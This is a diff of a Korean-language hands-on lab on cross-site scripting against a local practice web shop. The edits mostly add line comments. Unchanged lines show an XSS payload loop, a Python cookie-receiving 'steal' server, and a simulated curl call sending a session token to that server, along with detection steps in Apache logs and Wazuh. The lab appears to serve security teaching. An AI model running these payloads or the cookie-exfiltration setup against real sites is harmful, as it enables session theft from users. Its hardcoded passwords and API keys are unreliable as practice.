@@ -282,7 +282,7 @@ TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
 if [ -z "$TOKEN" ]; then
   curl -s -X POST http://10.20.30.80:3000/api/Users/ \
     -H "Content-Type: application/json" \
-    -d '{"email":"student@test.com","password":"Student123!","passwordRepeat":"Student123!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"test"}'
+    -d '{"email":"student@test.com","password":"Student123!","passwordRepeat":"Student123!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"test"}'  # 요청 데이터(body)
   TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"student@test.com","password":"Student123!"}' \
@@ -295,7 +295,7 @@ echo "Token: $TOKEN"
 curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "UserId": 1,
     "captchaId": 0,
     "captcha": "-1",
@@ -369,7 +369,7 @@ PAYLOADS=(
   "<iframe src='javascript:alert(1)'>"
 )
 
-for payload in "${PAYLOADS[@]}"; do
+for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
   echo "Testing: $payload"
   ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
   RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/rest/products/search?q=$ENCODED")
@@ -404,7 +404,7 @@ done
 ```bash
 # opsclaw 서버에서 간이 HTTP 서버 실행 (쿠키 수신용)
 # 터미널 1: 수신 서버 시작
-python3 -c "
+python3 -c "                                           # Python 코드 실행
 from http.server import HTTPServer, BaseHTTPRequestHandler
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -419,10 +419,10 @@ echo "Steal server PID: $STEAL_PID (port 9999)"
 
 # 터미널 2: XSS 페이로드가 동작한다면 다음과 같은 요청이 수신됨
 # (시뮬레이션)
-curl -s "http://10.20.30.201:9999/steal?cookie=token=eyJhbGciOi..." > /dev/null 2>&1
+curl -s "http://10.20.30.201:9999/steal?cookie=token=eyJhbGciOi..." > /dev/null 2>&1  # silent 모드
 
 # 서버 종료
-kill $STEAL_PID 2>/dev/null
+kill $STEAL_PID 2>/dev/null                            # 프로세스 종료
 ```
 
 > **실습 목적**: 실제 XSS가 성공하면 이런 방식으로 쿠키가 유출된다는 것을 이해하기 위한 시뮬레이션이다.
@@ -512,6 +512,8 @@ document.getElementById('output').innerHTML = clean;
 
 ### 7.1 웹 서버 로그에서 XSS 흔적
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # web 서버의 Apache 접근 로그 확인
 sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
@@ -524,6 +526,8 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
 
 ### 7.2 Wazuh에서 XSS 탐지
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # Wazuh에서 XSS 관련 알림 확인
 sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
@@ -533,6 +537,8 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
 ---
 
 ## 8. OpsClaw로 XSS 테스트 자동화
+
+OpsClaw Manager API를 호출하여 작업을 수행합니다.
 
 ```bash
 # XSS 테스트 프로젝트 생성
@@ -544,15 +550,15 @@ PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
 
 # Stage 전환
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
-  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
-  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null     # API 인증 키
 
 # XSS 페이로드 테스트 자동 실행
 curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
   -H "Content-Type: application/json" \
   -H "X-API-Key: opsclaw-api-key-2026" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "tasks": [
       {"order":1, "instruction_prompt":"curl -sI http://10.20.30.80:3000/ | grep -iE \"content-security|x-xss|x-frame\"", "risk_level":"low"},
       {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E | head -5", "risk_level":"low"}
